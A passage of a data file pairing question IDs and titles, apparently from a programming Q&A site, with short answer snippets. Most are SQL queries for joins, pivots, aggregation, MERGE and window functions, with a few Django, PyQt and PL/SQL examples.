        SET @EndIndex = CHARINDEX(@Character, @Input, @StartIndex)             
    END

    --CHARINDEX returned -1 so we're done but we need to append the rest
    IF @result <> ''
        SET @result += ', '

    SET @result += '[Branch].[Branch Number].&[' + 
        SUBSTRING(@Input, @StartIndex, LEN(@Input)) + ']'            

    RETURN @result
END
GO
"
10799,22144,SQL value not in the same row,"select all_other_fields
,      max(case
       when len(convert(varchar(12), t1.referenceinfo)) > 11 then (+'""') + rtrim(convert(varchar(12), t1.referenceinfo)) + '""'
       when len(convert(varchar(12), t2.referenceinfo)) > 11 then (+'""') + rtrim(convert(varchar(12), t2.referenceinfo)) + '""'
       else '""""'
       end) as [identity number]
,      max(case
       when len(convert(varchar(12), t1.referenceinfo)) < 12 then (+'""') + rtrim(convert(varchar(12), t1.referenceinfo)) + '""'
       when len(convert(varchar(12), t2.referenceinfo)) < 12 then (+'""') + rtrim(convert(varchar(12), t2.referenceinfo)) + '""'
       else '""""'
       end) as [approvalcode]
from   guest_check_line_item_hist t1
join   guest_check_line_item_hist t2
on     t1.ReceiptNo = t2.ReceiptNo
group
by     all_other_fields
"
4278,37733,Assign count value from select statement,"DECLARE @count int

set @count= 
(
    select count(1) 
    from 
    (
        SELECT Tag FROM @Tags 
        intersect 
        SELECT Tag from @TagsFromRecord
    ) AS T
)
"
32835,54797,Django - Filter a queryset by Max(date) year,"max_year = Expo.objects.latest('date').date.year
expos = Expo.objects.filter(date__year=max_year)
"
34631,33024,How to create a hardcoded date parameter for use in a query?,"SELECT * FROM User 
WHERE LastActivity > '19800101';
"
7456,65780,Select without Group By Sql,"SELECT U.UserId, U.UserName, F.Verified, F.FriendUserId
FROM Friends F
JOIN aspnet_Users U ON U.UserId=F.UserId
WHERE F.FriendUserId='3d1224ac-f2ad-45d4-aa84-a98e748e3e57'
UNION 
SELECT U.UserId, U.UserName, F.Verified, F.FriendUserId
FROM Friends F
JOIN aspnet_Users U ON U.UserId=F.FriendUserId
WHERE F.UserId='3d1224ac-f2ad-45d4-aa84-a98e748e3e57'
"
6195,17180,How do you create in-line commenting in SQL (with SQL-Server)?,"select SessionSID
, TargetID
--, TargetName
, FEDSurveyName 
, SupplierID
, ClientLK_ResponseStatusID 
from BI_Sessions (nolock)
WHERE EntryDate BETWEEN '05-15-2012' AND '05-16-2012'
AND SupplierID = 336
"
8643,19653,MySQL Two Table Query Count,"SELECT
  `GROUP NAME`,
  COUNT(B.GROUPNUM)
FROM
  A
  INNER JOIN B ON A.GROUPNUM = B.GROUPNUM
GROUP BY `GROUP NAME`
"
14474,63068,Create 1000 Function W/ Leading 0's,"SELECT RIGHT('0000' + CONVERT(VARCHAR(5), DocumentID  /1000) , 5)+ '000'
"
31336,13271,How to count words in specific column against matching words in another table,"WITH
Detail AS (
  SELECT
    W.id
    , W.word
    , T.extext
    , (LEN(REPLACE(T.extext, ' ', '  ')) + 2
      - LEN(REPLACE(' '
                    + UPPER(REPLACE(REPLACE(REPLACE(REPLACE(T.extext, ' ', '  '), ':', ' '), '.', ' '), ',', ' '))
                    + ' ', ' ' + UPPER(W.word) + ' ', '')) - 1
      ) / (LEN(W.word) + 2) count
  FROM Table_Words W
  JOIN TestSite_Info T
    ON CHARINDEX(UPPER(W.word), UPPER(T.extext)) > 0
)
INSERT INTO Result
SELECT
  id
  , SUM(count) total
FROM Detail
GROUP BY id
;
"
162,25086,Sum total of table with two related tables,"SELECT name, IFNULL(f.total, 0) AS total_fruit, IFNULL(c.total, 0) AS total_cookie
FROM person AS p
LEFT JOIN (SELECT person_idperson, SUM(cost) AS total
           FROM fruit
           GROUP BY person_idperson) AS f
ON p.idperson = f.person_idperson
LEFT JOIN (SELECT person_idperson, SUM(cost) AS total
           FROM cookie
           GROUP BY person_idperson) AS c
ON p.idperson = c.person_idperson
"
5381,58007,Summing Values Based On Columns & Combining,"select 
  AgtId,
  SUM(case when AppsStatusType IN ('IS', 'CP') then ColPrem else 0 end) as IS_CP,
  SUM(case when AppsStatusType = 'PD' then ColPrem else 0 end) as PD
FROM yourtable
GROUP BY AgtId
"
29572,73496,SQL Server Select After Merge Join on Column,"if object_id('tempdb.dbo.#desttable') is not null
    drop table #desttable 

create table #desttable ( instypeid smallint identity(0,1) primary key
, instext varchar(64) )
Go
declare @inserted table ( idvalue smallint, instext varchar(64) )
declare @thing1 instype

insert into @thing1 values ( -1 , 'zero' ), ( -1 , 'one' )

Merge #desttable desttbl
        Using @thing1  srctbl
        On desttbl.instypeid = srctbl.instypeid
        When Not Matched Then
            Insert ( instext )
            Values ( instext )
        Output inserted.instypeid, inserted.instext Into @inserted
    ;

SELECT  *
FROM    @inserted
"
17798,21548,Inserting variable along with data from select,"INSERT INTO results(ClassCode, AttemptDate, StudentID, Mark, Other_column) 
SELECT F1,F2,F3,F4, 'extraVariable'
FROM ...
"
31920,18461,Aggregating several columns to single column,"create temp table t(
    id      smallint,
    cat     smallint,
    data    char(10)
) with no log;

insert into t values (1, 1, ""foo"");
insert into t values (2, 1, ""bar"");
insert into t values (3, 1, ""baz"");
insert into t values (4, 2, ""some"");
insert into t values (5, 2, ""random"");
insert into t values (6, 3, ""Data 1"");
insert into t values (7, 2, ""data"");
insert into t values (8, 3, ""Data 2"");
insert into t values (9, 3, ""Data 3"");
insert into t values (10, 4, ""some"");
insert into t values (11, 4, ""more"");
insert into t values (12, 4, ""random"");
insert into t values (13, 4, ""data"");
insert into t values (14, 4, ""for"");
insert into t values (15, 4, ""testing"");
insert into t values (16, 5, ""one"");

select
   cat,
   max(case when cnt = 3 then id end) as id1,
   max(case when cnt = 2 then id end) as id2,
   max(case when cnt = 1 then id end) as id3,
   max(case when cnt = 3 then data end) as data1,
   max(case when cnt = 2 then data end) as data2,
   max(case when cnt = 1 then data end) as data3
from
   (
       select
          a.cat,
          a.id,
          a.data,
          count(*) as cnt
       from
          t a,
          t b
       where
          a.cat = b.cat and
          a.id <= b.id
       group by
          a.id,
          a.cat,
          a.data
       having
          count(*) <= 3
   )
group by
    1
order by
    1;

cat    id1    id2    id3 data1      data2      data3

  1      1      2      3 foo        bar        baz
  2      4      5      7 some       random     data
  3      6      8      9 Data 1     Data 2     Data 3
  4     13     14     15 data       for        testing
  5                   16                       one
"
26754,57218,Last 5 related records for multiple records,"SELECT reading,
       date
FROM   (select sensor_id,
               reading,
               date,
               @num := if(@sensor_id = sensor_id, @num + 1, 1) as row_number,
               @sensor_id := sensor_id                         as dummy
        from   sensor_readings
        order  by sensor_id,
                  date desc) T
WHERE  row_number<=5  
"
28101,54281,C# SQL Top as parameter,"SELECT TOP (@topparam) * from table1
"
17357,26856,SELECT MySQL field that contains a substring,"SELECT  keyword 
FROM    table 
WHERE   ('Tell me about admission info' LIKE CONCAT('%', keyword, '%'))
"
5551,5037,Combining two datetime fields into two separate columns in T-SQL,"DECLARE @EventTable TABLE(
        EventTime DATETIME,
        BooleanField INT
)

INSERT INTO @EventTable (EventTime,BooleanField) SELECT '1/1/2010 6:00AM',1 
INSERT INTO @EventTable (EventTime,BooleanField) SELECT '1/2/2010 6:00AM',0 
INSERT INTO @EventTable (EventTime,BooleanField) SELECT '1/3/2010 6:00AM',1 
INSERT INTO @EventTable (EventTime,BooleanField) SELECT '1/4/2010 6:00AM',1 
INSERT INTO @EventTable (EventTime,BooleanField) SELECT '1/5/2010 6:00AM',0

;WITH Dates AS (
        SELECT  *,
                (SELECT MIN(EventTime) FROM @EventTable WHERE EventTime > e.EventTime AND BooleanField = 0) EndDate
        FROM    @EventTable e
        WHERE   BooleanField = 1
)
SELECT  MIN(EventTime) StartDate,
        EndDate
FROM    Dates
GROUP BY EndDate
"
31724,6058,Insert values in table only one column changes value,"INSERT INTO table(GROUP_ID, PROJECTS)
    select 10001, 1 from dual union all
    select 10001, 2 from dual union all
    . . . ;
"
8490,42483,Select 1 record where two records have the the same values in different columns,"select ""station_1_I"", ""station_2_I"" from mytable
intersect
select ""station_2_I"", ""station_1_I"" from mytable 
             where ""station_2_I"" < ""station_1_I""
"
30428,12232,Date Functions in SQL,"SELECT CERT_DATE ""Date Of Last Cert Test"",
       ADD_MONTHS(CERT_DATE, 6) ""Date Due""
FROM TESTING.CERTS
WHERE MONTHS_BETWEEN(CURRENT_DATE, CERT_DATE) <= 3
"
14061,54252,SUM and Subtract result depending by column result in Mysql query,"SELECT SUM(CASE WHEN cashtransactionstatus_id IN (1,3) THEN cashtransaction_amount END) -
       SUM(CASE WHEN cashtransactionstatus_id IN (2,4,5) THEN cashtransaction_amount END) AS endtotal
FROM cash_transactions 
WHERE cashpaymenttype_id = 1
"
12374,70143,Select unique record for each person based on 1 column,"select *
from tablename t
where mailing = 1
union all
select *
from tablename t
where not exists (select 1 from tablename t2 where t2.uniqueid = t.uniqueid);
"
4549,45879,Find a string within an array column in PostgreSQL,"select ... 
  from ... 
 where ... 
       and array_to_string(authors, ', ') like '%123456789%';`
"
4211,39997,UPDATE or MERGE INTO or maybe anything else,"MERGE INTO  d
USING (SELECT a.id, SUM(a.sales) sum_of_sales
       FROM   a,b,c
       WHERE  a.id = b.id
       AND    b.region = c.region
       GROUP BY a.id) q
WHEN MATCHED THEN UPDATE SET d.sum_of_sales = q.sum_of_sales
"
22969,20114,Group by id having max(date_field),"SELECT  c.firstname, 
        c.lastname, 
        d.product_name, 
        o.payment, 
        s.name, 
        h.date_add
FROM    ps_orders o
        INNER JOIN ps_order_detail d ON d.id_order = o.id_order
        INNER JOIN ps_customer c ON c.id_customer = o.id_customer
        INNER JOIN ps_order_history h ON o.id_order = h.id_order
        INNER JOIN  
        (
            SELECT  id_order, MAX(date_add) max_date
            FROM    ps_order_history
            GROUP   BY id_order
        ) x ON  h.id_order = x.id_order AND
                h.date_add = x.max_date
        INNER JOIN ps_order_state_lang s ON s.id_order_state = h.id_order_state
WHERE   s.id_lang =6
GROUP   BY c.id_customer
"
22594,69961,Join multiple tables on one specific column,"SELECT
    WS.""ID worksite"",
    C.""Full name"" AS CompanyName,
    A.""Full name"" AS AuthorityName
FROM
    Worksite AS WS
LEFT OUTER JOIN Names C ON C.ID = WS.CompanyID
LEFT OUTER JOIN Names A ON A.ID = WS.AuthorityID
"
17343,45753,"Grabbing last order date, total orders and total amount with one query?","SELECT
    MAX(date_created) as last_order_date, 
    SUM(total_count) as total_sum, 
    COUNT(id) AS total_orders 
FROM
    `orders` 
WHERE
    `user_id` = '96838' 
    AND
    `status` IN ('new', 'delivered')
"
4731,6603,SELECT doesn't display column names,"SET LIN 32000 pagesize 1
- OR -
SET LIN 32000 PAGES 1
"
23937,1495,Recreate table with data and relations,"ALTER TABLE <your child table> DROP CONSTRAINT <your constraint>;
"
13084,23403,Selecting the last entry in sql database for each id field,"WITH cte 
AS
(
     SELECT *,
         ROW_NUMBER() OVER
         (
             PARTITION BY Reg_No
             ORDER BY Transdate DESC
         ) AS RowNumber
     FROM unithistory
)
SELECT *
FROM cte
WHERE RowNumber = 1
"
28458,51127,PostgreSQL: How to list all available datatypes?,"$ psql -E regress
regress=> \dT *
********* QUERY **********
SELECT n.nspname as ""Schema"",
  pg_catalog.format_type(t.oid, NULL) AS ""Name"",
  pg_catalog.obj_description(t.oid, 'pg_type') as ""Description""
FROM pg_catalog.pg_type t
     LEFT JOIN pg_catalog.pg_namespace n ON n.oid = t.typnamespace
WHERE (t.typrelid = 0 OR (SELECT c.relkind = 'c' FROM pg_catalog.pg_class c WHERE c.oid = t.typrelid))
  AND NOT EXISTS(SELECT 1 FROM pg_catalog.pg_type el WHERE el.oid = t.typelem AND el.typarray = t.oid)
  AND pg_catalog.pg_type_is_visible(t.oid)
ORDER BY 1, 2;
**************************
"
34496,25117,select max value of a column in table with no rows,"SELECT COALESCE(MAX(ROUTE_ID),0) ...
"
34091,27990,Inserting extra rows within table,"INSERT INTO my_table
SELECT item_number, NULL AS operation, NULL AS resource_code 
FROM my_table 
GROUP BY item_number
UNION ALL
SELECT item_number, NULL AS operation, NULL AS resource_code 
FROM my_table 
GROUP BY item_number
"
21136,38536,SQL Items in a linked range,"SELECT
    r.Name,
    COUNT(i.Ingredient) AS Ingredients
FROM
    recipes r
    LEFT JOIN ingredients i 
        ON i.Recipe = r.RecipeID
        AND i.Ingredient IN ('milk','butter','sugar','flour','egg')
GROUP BY r.Name
HAVING COUNT(i.Ingredient) BETWEEN 2 AND 4
"
10238,75363,SQL update only when non null,"UPDATE main
SET main.PCH_2YR =sub.PCH_2YR
FROM [dbWebsiteLO3-PRICING]..Vehicles_Staging_Data main LEFT JOIN
[dbGlobalPricingMatrix].[dbo].[tblPCHLookup_Test] sub ON 
sub.capid = main.capid AND
sub.milespa = main.mileage AND
sub.maintained = main.maintenance AND sub.pch_2yr IS NOT NULL
WHERE sub.PCH_2YR is NOT NULL
"
33695,70748,SQl Query : how to aggregate on part of date,"select
    oi.product_name,
    sum(iif(month(o.order_date) = 1, oi.items_purchased_count, 0)) as JAN,
    sum(iif(month(o.order_date) = 2, oi.items_purchased_count, 0)) as FEB,
    ...
from orders o
inner join order_items oi on o.order_id = oi.order_id
group by oi.product_name
"
36439,43075,Subtraction between two queries,"select * from b where 
not exists (select no from A where A.id=B.id and date=@yourdate)
"
20758,70053,How can I write this Query in another way,"SELECT u.firstname, u.lastname, u.username, u.alt_id, u.email, cg.group_name
FROM user u LEFT JOIN
     class_group cg
     ON find_in_set(u.id, list_students_id) > 0;
"
3522,10347,Order comments by thread path and by number of total votes,"WITH RECURSIVE first_comments AS (
(
 (
   SELECT id, text, level, parent_id, array[id] AS path, total_votes,
          array[-total_votes, id] AS path_and_votes
   FROM comments
   WHERE comments.""postId"" = 1 AND comments.""level"" = 0 
 )
)
UNION
 (
  SELECT e.id, e.text, e.level, e.parent_id, (fle.path || e.id), e.total_votes,
         (fle.path_and_votes || -e.total_votes || e.id)
  FROM
  (
    SELECT id, text, level, parent_id, total_votes FROM comments
    WHERE comments.""postId"" = 1
  ) e, first_comments fle
  WHERE e.parent_id = fle.id
 )
)
SELECT id, text, level, total_votes, path from first_comments ORDER BY path_and_votes ASC
"
17390,61216,Simple MySQL Duplicate Removal,"SELECT DISTINCT IDPosts, profile_picture, body, post_date, expires,
      filename, username
FROM Posts JOIN
     Users 
     ON Posts.IDUser = Users.IDUser
WHERE 
      (expires IS NULL OR expires >= NOW() )
ORDER BY `Posts`.`post_date` DESC;
"
35005,25851,Analytic function - Comparing values using LAG(),"select case 
         when col1 = lag(col1,1,col1) over (partition by trunc(col2) order by col2) then 0 
         else 1
       end as changes
from the_table;
"
13878,9343,PyQt Get cell from TableView with header label,"def columnFromLabel(self, label):
    model = self.table.horizontalHeader().model()
    for column in range(model.columnCount()):
        if model.headerData(column, QtCore.Qt.Horizontal) == label:
            return column
    return -1
"
964,53167,Cache Table data and performe search on it,"declare
-- type and array to hold all the data from the query
type sites_rec_t is record (
    addr_id             t_sites.addr_id%type,
    code                t_sites.code%type,
    description         t_sites.description%type,
    pm_telephone        t_sites.pm_telephone%type
);

-- array for the lookups
type sites_t is table of sites_rec_t index by varchar2(10);
a_sites sites_t;
v_site_arr_key  varchar2(10);

begin

-- populate the arrays
for r in ( select addr_id, code, description, pm_telephone from t_sites ) loop
    a_sites(r.code).addr_id := r.addr_id;
    a_sites(r.code).code := r.code;
    a_sites(r.code).description := r.description;
    a_sites(r.code).pm_telephone := r.pm_telephone;
end loop;

-- example of how to loop through the varchar indexed array as you cant do for i in 1 .. array.count loop
v_site_arr_key := a_sites.first;
while v_site_arr_key is not null loop
    dbms_output.put_line(v_site_arr_key || '=' || a_sites(v_site_arr_key).description || ', ' || a_sites(v_site_arr_key).addr_id);
    v_site_arr_key := a_sites.next(v_site_arr_key);
end loop;

end;
"
7047,43285,SQL users searching query,"SELECT * FROM  `users` WHERE (
       (firstname LIKE '%mat%' OR lastname LIKE '%mat%' OR
        phone LIKE '%mat%' OR email LIKE '%mat%' OR username LIKE '%mat%')
       AND
       (firstname LIKE '%h%' OR lastname LIKE '%h%' OR
        phone LIKE '%h%' OR email LIKE '%h%' OR username LIKE '%h%')
       AND
       (firstname LIKE '%50%' OR lastname LIKE '%50%' OR
        phone LIKE '%50%' OR email LIKE '%50%' OR username LIKE '%50%')
       AND
       (firstname LIKE '%@l%' OR lastname LIKE '%@l%' OR
        phone LIKE '%@l%' OR email LIKE '%@l%' OR username LIKE '%@l%')
       AND
       (firstname LIKE '%d%' OR lastname LIKE '%d%' OR
        phone LIKE '%d%' OR email LIKE '%d%' OR username LIKE '%d%')
      )
"
11587,58551,Hexadecimal sequence in Oracle,"TO_CHAR(your_sequence.NEXTVAL,'XXXXXXXXXXXXXXXX')
"
8336,60060,SQL query to update,"MERGE
INTO    employee
USING   (
        select distinct ""name"", count(*) over (partition by ""name"") cnt from works
        )x
ON      (employee.""name"" = x.""name"")
WHEN MATCHED THEN
UPDATE
SET     salary = salary+(100*case when cnt=1 then 0 else cnt end);
"
7640,24240,Discover what process/query is using oracle temp tablespace,"SELECT   b.TABLESPACE
       , b.segfile#
       , b.segblk#
       , ROUND (  (  ( b.blocks * p.VALUE ) / 1024 / 1024 ), 2 ) size_mb
       , a.SID
       , a.serial#
       , a.username
       , a.osuser
       , a.program
       , a.status
    FROM v$session a
       , v$sort_usage b
       , v$process c
       , v$parameter p
   WHERE p.NAME = 'db_block_size'
     AND a.saddr = b.session_addr
     AND a.paddr = c.addr
ORDER BY b.TABLESPACE
       , b.segfile#
       , b.segblk#
       , b.blocks;
"
324,75479,IBM i UNION *ALL used here,"CREATE VIEW yourViewName AS 
SELECT *
FROM JETDTA.EODDETAILH
UNION
SELECT *
FROM JETDTA.EODDETAILS
"
34783,9494,MySQL Advanced Query Brainteaser,"select
    r.referrer,
    t.type,
    (case 
    	when isnull(ref_prior.referrals, 0) < @max1 then 
    		(case 
    			when isnull(ref_prior.referrals, 0) + isnull(ref_period.referrals, 0) < @max1 then isnull(ref_period.referrals, 0) 
    			else @max1 - isnull(ref_prior.referrals, 0) 
    		end) 
    	else 0 
    end) * (case t.type when 'A' then r.Comm_A1 when 'B' then r.Comm_B1 else null end) +
    (case when isnull(ref_prior.referrals, 0) + isnull(ref_period.referrals, 0) > @max1 then
    	(case 
    		when isnull(ref_prior.referrals, 0) < @max2 then 
    			(case 
    				when isnull(ref_prior.referrals, 0) + isnull(ref_period.referrals, 0) < @max2 then isnull(ref_period.referrals, 0) 
    				else @max2 - isnull(ref_prior.referrals, 0) 
    			end) 
    		else 0 
    	end) -
    	(case 
    		when isnull(ref_prior.referrals, 0) < @max1 then 
    			(case 
    				when isnull(ref_prior.referrals, 0) + isnull(ref_period.referrals, 0) < @max1 then isnull(ref_period.referrals, 0) 
    				else @max1 - isnull(ref_prior.referrals, 0) 
    			end) 
    		else 0 
    	end)
    else 0 end) * (case t.type when 'A' then r.Comm_A2 when 'B' then r.Comm_B2 else null end) +
    (case when isnull(ref_prior.referrals, 0) + isnull(ref_period.referrals, 0) > @max2 then
    	(isnull(ref_period.referrals, 0)) -
    		(
    			(case when isnull(ref_prior.referrals, 0) + isnull(ref_period.referrals, 0) > @max1 then
    				(case 
    					when isnull(ref_prior.referrals, 0) < @max2 then 
    						(case 
    							when isnull(ref_prior.referrals, 0) + isnull(ref_period.referrals, 0) < @max2 then isnull(ref_period.referrals, 0) 
    							else @max2 - isnull(ref_prior.referrals, 0) 
    						end) 
    					else 0 
    				end) -
    				(case 
    					when isnull(ref_prior.referrals, 0) < @max1 then 
    						(case 
    							when isnull(ref_prior.referrals, 0) + isnull(ref_period.referrals, 0) < @max1 then isnull(ref_period.referrals, 0) 
    							else @max1 - isnull(ref_prior.referrals, 0) 
    						end) 
    					else 0 
    				end)
    			else 0 end) +
    			(case 
    				when isnull(ref_prior.referrals, 0) < @max1 then 
    					(case 
    						when isnull(ref_prior.referrals, 0) + isnull(ref_period.referrals, 0) < @max1 then isnull(ref_period.referrals, 0) 
    						else @max1 - isnull(ref_prior.referrals, 0) 
    					end) 
    				else 0 
    			end)
    		)   				
    else 0 end) * (case t.type when 'A' then r.Comm_A3 when 'B' then r.Comm_B3 else null end) as Total_Commission

from referrer r

join type t on 1 = 1 --intentional cartesian product
left join (select referrer, type, count(1) as referrals from referral where date < @start_date group by referrer, type) ref_prior on ref_prior.referrer = r.referrer and ref_prior.type = t.type
left join (select referrer, type, count(1) as referrals from referral where date between @start_date and @end_date group by referrer, type) ref_period on ref_period.referrer = r.referrer and ref_period.type = t.type
"
7186,41185,Using for loop i want to copy data from one table to another table in pl/sql code is under below,"INSERT INTO awais
(SELECT employee_id, first_name, salary into a_id, b_name, c_salary
 FROM   employees 
 WHERE employee_id='a_id' AND first_name='b_name' AND salary='c_salary');
"
13079,1765,Varchar to Number in sql,"SELECT CAST(REPLACE(Price_amount, ',', '') AS int) AS Price_Number FROM per_prices
"
21007,70011,Is it possible to Pivot data like this?,"select
    SubId,
    max(case when ProcessNumber = 802 then ReadTime end) as [802Time],
    max(case when ProcessNumber = 802 then Lineage end) as [802Lineage],
    ....
from SourceTable
group by SubId
"
7148,67500,Relational Calculus Left Outer Join,"{S|∃ D ∈ Doctor (∃ C ∈ Duty (D.Doc_id = C.Doc_id ^ (etc..) ) ) }

SELECT * FROM S
    WHERE EXISTS (SELECT * FROM Doctor D
        WHERE EXISTS (SELECT * FROM Duty C
             WHERE (D.Doc_id = C.Doc_id)
             AND (etc...)));
"
36361,61785,Select 1 of many rows linked to ID SQL,"create table mydb.test as
select substr(db1.table1.Account_Num, 1, 6) as Account_Number,
       substr(db1.table1.Descriptor, 1, 2) as Company_Description,
  from db1.table1 
       join db1.table2 
           on db1.table1.Account_Num = db1.table2.Account_Num
 where db1.table1.descriptor like 'Company:%'
        order by Account_Number Desc;
"
27110,21762,"Can a UDF return a list that can be used with an ""IN"" keyword?","CREATE FUNCTION dbo.Test()
RETURNS @funcTable TABLE 
(
    -- Columns returned by the function
    ID int PRIMARY KEY NOT NULL    
)
AS 
-- Return some arbitrary ints
BEGIN
    INSERT @funcTable VALUES (1)
    INSERT @funcTable VALUES (2)

    RETURN 
END

GO

-- Test it - insert 1,2,3 into a table var
DECLARE @SomeTable table (ID int)
INSERT INTO @SomeTable VALUES (1)
INSERT INTO @SomeTable VALUES (2)
INSERT INTO @SomeTable VALUES (3)

-- Select from @SomeTable where the ID is in the result of the UDF
select * from @SomeTable WHERE ID IN (SELECT ID FROM dbo.Test())
"
32845,42013,Grouping 2 lines in to 1,"SELECT PTaskID, MAX([Part Requisition]) as [MaxPartRequisition], 
                MAX([Service Requisition]) as  [MaxServiceRequisition]
FROM [Load]
GROUP BY PTaskID;
"
11985,567,Count number of times value appears in columns,"SELECT (sum(iif(Profile = ""################"", 1, 0)) +
        sum(iif(Notes = ""################"", 1, 0)) +
        sum(iif(CriminalConvictionsNotes = ""################"", 1, 0)) +
        sum(iif(HealthIssueNotes = ""################"", 1, 0)) +
        sum(iif(NextOfKinAddress = ""################"", 1, 0))
       ) AS NumBadValues        
FROM GPInformation 
WHERE Profile = ""################"" OR
      Notes = ""################"" OR
      CriminalConvictionsNotes = ""################"" OR
      HealthIssueNotes = ""################"" OR
      NextOfKinAddress = ""################"";
"
37137,14883,SQL Update beginning of NText in a column in MySQL table,"UPDATE Customers 
SET Customer_Address = REPLACE(CAST(Customer_Address AS NVARCHAR(MAX)),'Road=WalterRoad','Road=Spencers Place')
WHERE Customer_ID = 1
  -- AND INSTR(Customer_Address, 'Road=WalterRoad') > 0;
  -- AND CHARINDEX(CAST(Customer_Address AS NVARCHAR(MAX)), 'Road=WalterRoad') > 0; -- I am not sure which RDBMS you use
"
25641,14854,SQL Query to 'ORDER BY' on 3 different columns,"SELECT * FROM Questions
WHERE Identifier = @identifier AND Flag <> 'DELETED' 
ORDER BY Status DESC,  Number,
(case when flag is null then 1 else 0 end) desc, flag
"
20976,3009,How to get the last 4 digits of ssn,"SELECT RIGHT('123456789',4)
"
35079,5870,MySQL: List rows who have one but not another many-to-many relationship,"-- Persons that have both hobby A and B
select p.first_name,p.last_name
from persons p
inner join persons_hobbies ph1 on ph1.person_id = p.person_id and ph1.hobby_id = 3
inner join persons_hobbies ph2 on ph2.person_id = p.person_id and ph2.hobby_id = 7;

-- Persons that have hobby A but not B 
select p.first_name,p.last_name
from persons p
inner join persons_hobbies ph1 on ph1.person_id = p.person_id and ph1.hobby_id = 3
left outer join persons_hobbies ph2 on ph2.person_id = p.person_id and ph2.hobby_id = 7
where ph2.person_id is null;
"
137,55132,Select data from table with update if particular row does not exist,"WITH cte 
     AS (SELECT * 
         FROM   TBL 
         WHERE  TBL.Err_Type IN ( 4, 2 ) 
         UNION 
         SELECT 4, 
                0 
         WHERE  NOT EXISTS (SELECT 1 
                            FROM   TBL 
                            WHERE  TBL.Err_Type = 4) 
         UNION 
         SELECT 2, 
                0 
         WHERE  NOT EXISTS (SELECT 1 
                            FROM   TBL 
                            WHERE  TBL.Err_Type = 2)) 
SELECT * 
FROM   cte 
"
6508,74702,Only Selecting Specific Row Info From One Query,"WITH SiteArrivals AS (
SELECT DISTINCT
    s.SiteID,
    s.GroupID,
    saa.Time ArrivalTime,
    sas.ScannerUserID,
    ROW_NUMBER() OVER (PARTITION BY s.GroupID ORDER BY saa.Time DESC, s.SiteID DESC) rn
FROM 
    dbo.Sites s
    INNER JOIN dbo.SiteAppointments sa ON s.SiteID = sa.SiteID
    INNER JOIN dbo.SiteAppointmentsScanners sas ON sa.SiteAppointmentID = sas.SiteAppointmentID
    LEFT JOIN dbo.SiteAppointmentArrivals saa ON sa.SiteAppointmentID = saa.SiteAppointmentId 
                                          AND saa.ScannerUserID = sas.ScannerUserID )
SELECT * 
FROM SiteArrivals sa WHERE SiteID IS NOT NULL and rn = 1
"
34391,26548,How can I get several counts of a column in one SQL query?,"SELECT o.first_name, o.last_name, 
       SUM(CASE WHEN p.type = 'cat' THEN 1 ELSE 0 END) as cat_count,
       SUM(CASE WHEN p.type = 'dog' THEN 1 ELSE 0 END) as dog_count,
       SUM(CASE WHEN p.type = 'fish' THEN 1 ELSE 0 END) as fish_count
FROM PetOwners o
JOIN Pets p ON o.id = p.owner_id
GROUP BY o.id
"
8687,47577,Django Query: Annotate with `count` of a *window*,"activity_per_source = Source.objects.\
    filter(data__date__gte=one_week_ago).\
    annotate(count_data_records=Count('Data')).\
    order_by('-count_data_records').distinct()
"
39004,51607,How to determine in-script if a SQL statement failed,"BEGIN TRY
  DECLARE @X INT
  -- Divide by zero to generate Error
  SET @X = 1/0
  PRINT 'Command after error in TRY block'
END TRY
BEGIN CATCH
  PRINT 'Error Detected'
END CATCH
"
31053,52898,SQL Query using IN() and a mandatory value,"SELECT DISTINCT countryName, countrySlug, n.country_id, n2.country_id
FROM countries AS Country
INNER JOIN countries_networks AS n ON Country.id = n.country_id
AND n.network_id
IN ( 6, 7, 8, 9, 14 )
INNER JOIN countries_networks AS n2 ON Country.id = n2.country_id
AND n2.network_id = 2
"
1713,25509,SSRS parameter default to most recent 1st April,"=IIF(Today() >= DateSerial(Year(Today()), 4, 1), DateSerial(Year(Today()), 4, 1), DateSerial(Year(Today()) - 1, 4, 1))
"
39948,66755,Using PIVOT on column with date or datetime values,"DECLARE @startdt DATETIME, @enddt DATETIME, @QueryCol NVARCHAR(MAX)

SET @startdt = '2009-11-01'
SET @enddt = '2009-12-02'

WHILE @startdt <= @enddt
BEGIN
    SET @QueryCol=isnull(@QueryCol, '')+QUOTENAME(convert(nvarchar(20), @startdt, 101))+(CASE WHEN @startdt<>@enddt THEN ',' ELSE '' END)
    SET @startdt =  @startdt + 1
END

if(ISNULL(@QueryCol, '')<>'')
begin
    set @QueryCol='select * from t_interview_data
                    pivot (avg (widgets) for 
                    datestamp in ('+@QueryCol+')) as AvgWidgetsPerDayPerEmp'

    exec (@QueryCol)
end
"
8038,74308,Easier way to map record names for a column?,"SELECT SUM(COUNT) AS Actions, 
        (CASE event 
            WHEN 1 THEN 'Web' 
            WHEN 2 THEN 'iOS' 
            WHEN 3 THEN 'Android'
            WHEN 4 THEN 'Windows' 
            WHEN 5 THEN 'Mac' 
        ELSE 'Unknown' END )  AS Platform
FROM METRICS_WEEKLY
WHERE EVENT IN (1, 2, 3, 4 ,5 ,6) 
GROUP BY EVENT
"
6417,67131,How to optimize my pathfinding algorithm on a GTFS network,"call Get2CJourneys(dt, sd, sa, r1, r2, r3)
"
15593,8285,Using Stored Procedure variable in Like statement,"declare @id nvarchar(20)
select @id = '1'
SELECT * FROM tab WHERE id LIKE @id + '%'
"
22016,43456,"(My)SQL: SELECT first number not taken in series of numbers, similar to MAX()","SELECT t1.id + 1
FROM tbl t1
LEFT JOIN tbl t2
    ON t1.id + 1 = t2.id
WHERE t2.id IS NULL
ORDER BY t1.id ASC
LIMIT 1
"
38284,8729,"SQLite: %midstring% and stringstart% searching on multiple columns, but wanting successful stringstart% matches to always be returned first","SELECT *, (title||"" ""||tag) AS titletag, score*100 AS newscore
FROM sometable WHERE tag LIKE ""oo%""

UNION

SELECT *, (title||"" ""||tag) AS titletag, score AS newscore
FROM sometable WHERE titletag LIKE ""%oo%""

ORDER BY newscore DESC
"
6103,73357,nested Cursor TSQL (SQL Server),"-- INSERT INTO ##FlanschZuweisung (IDFZ, FL1, FL2)
SELECT row_number() over (order by t1.FlanschMin, t2. FlanschMin),
   t1.FlanschMin, t2. FlanschMin
FROM ##FlanschBreite as t1 CROSS JOIN ##FlanschBreite as t2
"
1419,52790,Command to insert into with select,"UPDATE Student SET age = 28 WHERE name = ""Jhon"";
"
5994,14602,MySQL - prevent duplicates for multiple insert statement without using a unique index,"INSERT INTO `table1` (`a`, `b`, `c`)
    select t.*
    from (select 'a' as a, 'b' as b, 'c' as c union all
          select '1', '2', 'bar' union all
          select 'd', 'e', 'f'
         ) t
